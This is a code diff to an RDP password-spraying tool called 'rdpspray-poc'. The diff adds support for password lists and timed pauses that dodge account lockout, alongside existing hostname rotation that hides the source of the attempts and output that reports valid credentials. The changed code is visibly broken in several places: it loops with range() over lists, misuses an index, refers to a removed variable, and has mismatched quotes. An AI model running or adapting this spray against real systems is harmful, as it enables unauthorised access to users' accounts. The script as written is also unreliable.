@@ -9,12 +9,14 @@ def help():
 	Usage: rdpspray-poc [options]"
 	\t-l: user list to password spray
 	\t-c: client list of hostnames to rotate through for each request
-	\t-p: password
+	\t-p: password list
 	\t-d: domain
 	\t-t: target RDP server
+	\t-n: loop n times then pause to prevent account lockout
+	\t-m: minutes to wait before resuming spray to prevent lockouts
 	"""
 try:
-	opts, args = getopt.getopt(sys.argv[1:], "l:c:p:d:t:")
+	opts, args = getopt.getopt(sys.argv[1:], "l:c:p:d:t:n:m:")
 except getopt.GetoptError:
 	help()
 for opt, arg in opts:
@@ -26,11 +28,15 @@ for opt, arg in opts:
 	elif opt == "-c":
 		clientlist = arg
 	elif opt == "-p":
-		password = arg
+		passlist = arg
 	elif opt == "-d":
 		domain = arg
 	elif opt == "-t":
 		target = arg
+	elif opt == "-n":
+		lockcount = arg
+	elif opt == "-m":
+		locktime = arg
 
 #Read username list to spray against
 with open(userlist) as f:
@@ -41,6 +47,11 @@ usernamesstripped = [x.strip() for x in usernames]
 with open(clientlist) as g:
 	hostnames = g.readlines()
 hostnamesstripped = [x.strip() for x in hostnames]
+
+#Read password list to spray with
+with open(passlist) as h:
+	passwords = h.readlines()
+passwordsstripped = [x.strip() for x in passwords]
 
 i = 0
 k = 0
@@ -61,27 +72,36 @@ logonsuccess_allowed = "Authentication only, exit status 0"
 status = None
 
 total_accounts = len(usernamesstripped)
+total_accounts = len(passwordsstripped)
+lock_counter = 0
 print "Total number of users: " + str(total_accounts)
 print "Password spraying has now started... please sit tight."
 
 #Now using xFreeRDP to spray accounts
-for i in range(total_accounts):
-	subprocess.call("hostnamectl set-hostname '%s'" % hostnamesstripped[k], shell=True)	
-	proc = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (target, domain, usernamesstripped[i], password), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
-	output = proc.stderr.read()
-	if logonfailed in output:
-		status = "invalid"
-	elif logonsuccess_nordp in output:
-		status = "valid_no_rdp"		
-		print "Cred probably valid but not allowed to RDP: " + usernamesstripped[i] + ":" +password
-	elif logonsuccess_allowed in output:
-		status = "success"
-		print "Cred successful: " + usernamesstripped[i] + ":" + password
+for i in range(passwordsstripped):
+	for j in range(usernamesstripped):
+		if lock_counter == lockcount:
+			print "Pausing for ' + str(locktime) + ' minutes...\n"
+			lock_counter = 0
+			time.sleep(locktime*60)
+		else:
+			subprocess.call("hostnamectl set-hostname '%s'" % hostnamesstripped[k], shell=True)	
+			proc = subprocess.Popen("xfreerdp /v:'%s' +auth-only /d:%s /u:%s /p:%s /sec:nla /cert-ignore" % (target, domain, usernamesstripped[i], passwordsstripped[i]), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+			output = proc.stderr.read()
+			if logonfailed in output:
+				status = "invalid"
+			elif logonsuccess_nordp in output:
+				status = "valid_no_rdp"		
+				print "Cred probably valid but not allowed to RDP: " + usernamesstripped[i] + ":" +password
+			elif logonsuccess_allowed in output:
+				status = "success"
+				print "Cred successful: " + usernamesstripped[i] + ":" + password
 	
-	if k < l:
-		k +=1
-	else:
-		k = 0
+			if k < l:
+				k +=1
+			else:
+				k = 0
+	lock_counter += 1
 
 #Reset hostname back to the original after completing the spray
 subprocess.call("hostnamectl set-hostname '%s'" % orighostname, shell=True)
